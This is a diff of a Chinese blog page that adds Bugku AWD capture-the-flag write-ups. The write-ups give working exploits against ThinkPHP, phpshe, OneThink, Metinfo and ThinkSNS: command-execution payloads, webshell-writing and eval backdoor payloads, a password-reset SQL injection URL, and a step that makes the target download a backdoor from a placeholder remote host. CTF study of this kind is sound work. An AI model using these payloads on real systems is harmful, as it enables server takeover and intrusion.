+aaaa<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span>GET<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system
+_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span>GET<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token keyword">get</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>whoami
+c<span class="token operator">=</span>system<span class="token operator">&amp;</span>f<span class="token operator">=</span>calc<span class="token operator">&amp;</span>_method<span class="token operator">=</span>filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>写shell</strong></p>
+<pre class="line-numbers language-javascript"><code class="language-javascript">s<span class="token operator">=</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'zerosec.php'</span><span class="token punctuation">,</span><span class="token string">'&lt;?php phpinfo();'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span>POST<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>assert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>有captcha路由时无需debug=true</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript">URL：xxxx<span class="token operator">/</span>captcha<span class="token punctuation">.</span>html
+_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>method<span class="token operator">=</span>GET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>0x03 后门一句话</strong></p>
+<p><strong>位置：admin/config.php</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/5dd4012ff7a103329117e29aaef73512.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/5f010aeb6c751fadc80738ba6a43778e.png" alt="img"></p>
+<h2 id="Bugku-S1-AWD排位赛-4-writeup"><a href="#Bugku-S1-AWD排位赛-4-writeup" class="headerlink" title="Bugku S1 AWD排位赛-4 writeup"></a>Bugku S1 AWD排位赛-4 writeup</h2><p>phpshe v1.1系统重装漏洞</p>
+<p><strong>0x01 getshell</strong></p>
+<p>直接访问/install</p>
+<p>在安装时，在数据表前缀写入：’);phpinfo();</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/b079309b64749a0d5e9fa89888d57c7e.png" alt="img"></p>
+<p>看一下config.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/7eac21c5fe9401feb7a3e2241a02fc4e.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/b879d15349a1751ddcf0809bd151b2ca.png" alt="img"></p>
+<p><strong>0x02 内置后门</strong></p>
+<p><strong>位置：xxx.com**</strong>/data/cache/system.cache.php**</p>
+<p><strong>其中密码为md5加密过的，解密一下访问即可</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210416/5ece78ef3bd28485f287f79d09ade8f2.png" alt="QQ截图20210416173153.png"></p>
+<p><strong>0x03 后台上传</strong></p>
+<h2 id="Bugku-S1-AWD排位赛-5-writeup"><a href="#Bugku-S1-AWD排位赛-5-writeup" class="headerlink" title="Bugku S1 AWD排位赛-5 writeup"></a>Bugku S1 AWD排位赛-5 writeup</h2><p>0x01 OneThink1.0文件缓存漏洞</p>
+<p>在OneThink的注册界面中的注册用户名为：</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">%</span><span class="token number">0</span><span class="token function">aphpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>并且用burp抓包将%0a解码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/8e51c68d15e77c208081f407c312051d.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/a80c97cb708c8156d2dd006761848d32.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/5b15ff730f7cd70f162ac98622f757af.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/2dd40fa9bed985e21240b68668b8383c.png" alt="img"></p>
+<p>之后用这个用户名登陆，同样抓包将%0a解码，之后访问Runtime/Temp目录下的2bb202459c30a1628513f40ab22fa01a.php，此文件是写死的，所以不怕找不到文件。即可发现phpinfo得以执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/b1e641bad6d35d5513d0e6fea28a362e.png" alt="img"></p>
+<p>GETSHELL</p>
+<p>分别用两个用户名去注册转码登录</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">%</span>0a\$a<span class="token operator">=</span>\$_POST<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>#
+<span class="token operator">%</span><span class="token number">0</span><span class="token function">aeval</span><span class="token punctuation">(</span>\$a<span class="token punctuation">)</span><span class="token punctuation">;</span>#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>之后文件的内容就变成了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/063e38f2a279a9e01270cd640b77c76a.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210325/fc38c683eb050c857bb04ebffd9c2b92.png" alt="img"></p>
+<p>[OneThink CMS的缓存漏洞的分析](<a href="https://ox1234.github.io/2018/07/27/OneThink" target="_blank" rel="noopener">https://ox1234.github.io/2018/07/27/OneThink</a> CMS的缓存漏洞的分析/)</p>
+<p><a href="https://www.anquanke.com/post/id/152584" target="_blank" rel="noopener">OneThink1.0文件缓存漏洞分析及题目复现</a></p>
+<h2 id="Bugku-S1-AWD排位赛-6-writeup"><a href="#Bugku-S1-AWD排位赛-6-writeup" class="headerlink" title="Bugku S1 AWD排位赛-6 writeup"></a>Bugku S1 AWD排位赛-6 writeup</h2><p><strong>后台登录</strong></p>
+<p>通过弱口令admin:123456进入<a href="http://127.0.0.1:8002/admin/login/login.php" target="_blank" rel="noopener">http://127.0.0.1:8002/admin/login/login.php</a> 后台， 或者是通过<a href="http://127.0.0.1:8002/include/hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23" target="_blank" rel="noopener">http://127.0.0.1:8002/include/hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23</a> 将密码重置为1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210416/639ba0149d7f38e74f1eb47d16373e7d.png" alt="luffy3.png"></p>
+<p><strong>上传木马</strong></p>
+<p>Metinfo的后台可以通过上传模版的方式获得webshell,在界面风格-&gt;模版风格-&gt;添加新模板处</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210416/1204bb78960415ae22fd339829a6bef7.png" alt="luffy.png"></p>
+<p>但是后台对于一些危险的函数比如eval,asssert,system进行了过滤，所以需要一个特殊的木马</p>
+<p>写到php文件里打包成zip，通过界面风格-&gt;添加新模版 然后通过访问<a href="http://10.0.0.9:8082/templates/trojan.php?e=assert" target="_blank" rel="noopener">http://10.0.0.9:8082/templates/trojan.php?e=assert</a> post pass=system(“ls”);即可执行命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210416/6f5be9d5599b4cadc14dbe3957522fda.png" alt="luffy2.png"></p>
+<h2 id="Bugku-S1-AWD排位赛-7-writeup"><a href="#Bugku-S1-AWD排位赛-7-writeup" class="headerlink" title="Bugku S1 AWD排位赛-7 writeup"></a>Bugku S1 AWD排位赛-7 writeup</h2><p><strong>漏洞介绍</strong></p>
+<p>ThinkSNS_V4 后台任意文件下载导致Getshell</p>
+<p>默认后台地址：<a href="http://127.0.0.1/index.php?app=admin&amp;mod=Public&amp;act=login" target="_blank" rel="noopener">http://127.0.0.1/index.php?app=admin&amp;mod=Public&amp;act=login</a> </p>
+<p>默认用户密码：管理员帐号: <a href="mailto:admin@admin.com" target="_blank" rel="noopener">admin@admin.com</a> 密码:123456</p>
+<p>存在漏洞代码\\ts4\\apps\\admin\\Lib\\Action\\UpgradeAction.class.php中的一个函数中。</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    $downUrl <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'upurl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    $downUrl <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span>$downUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    $path <span class="token operator">=</span> DATA_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token string">'upgrade/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span>$downUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// # 备份老配置文件</span>
+    $oldConf <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>CONF_PATH<span class="token punctuation">.</span><span class="token string">'/thinksns.conf.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span>DATA_PATH<span class="token punctuation">.</span><span class="token string">'/old.thinksns.conf.php'</span><span class="token punctuation">,</span> $oldConf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// # 下载增量包</span>
+    <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span>$path<span class="token punctuation">)</span><span class="token punctuation">)</span> or <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span>$path<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span>$path<span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>$downUrl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">file_exists</span><span class="token punctuation">(</span>$path<span class="token punctuation">)</span> or $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">'下载升级包失败，请检查'</span><span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>$path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'目录是否可写，如果可写，请刷新重试！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">// 验证hash判断包是否合法。</span>
+    $filename <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span>$path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/upgrade.json'</span><span class="token punctuation">;</span>
+    $data <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    $data <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span>$data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5_file</span><span class="token punctuation">(</span>$path<span class="token punctuation">)</span> <span class="token operator">!=</span> $data<span class="token operator">-</span><span class="token operator">></span>md5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        $<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">'更新包校验失败，请重新执行升级.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在这段函数中，先备份老配置文件，然后下载增量包，下载参数$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包， 导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。</p>
+<p>在自己的服务器创建一个door.php</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php   
+echo <span class="token string">"&lt;?php"</span><span class="token punctuation">;</span>
+echo <span class="token string">"eval(file_get_contents('php://input'));"</span><span class="token punctuation">;</span>  
+echo <span class="token string">"?>"</span><span class="token punctuation">;</span>  
+<span class="token operator">?</span><span class="token operator">></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后访问 <a href="http://127.0.0.1:8001/index.php?app=admin&amp;mod=Upgrade&amp;act=step1&amp;upurl=http://xxxxx.com/door.php" target="_blank" rel="noopener">http://127.0.0.1:8001/index.php?app=admin&amp;mod=Upgrade&amp;act=step1&amp;upurl=http://xxxxx.com/door.php</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210421/0e166ec4967ffc62992df5afbc683398.png" alt="luffy2.png"></p>
+<p>此外还附带一个一句话后门 </p>
+<p>位置：/data/database/config.php</p>
 
             </div>
             <hr/>
@@ -1672,7 +1922,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">133.3k</span> 字
+                <span class="white-color">143.9k</span> 字
             
 
             
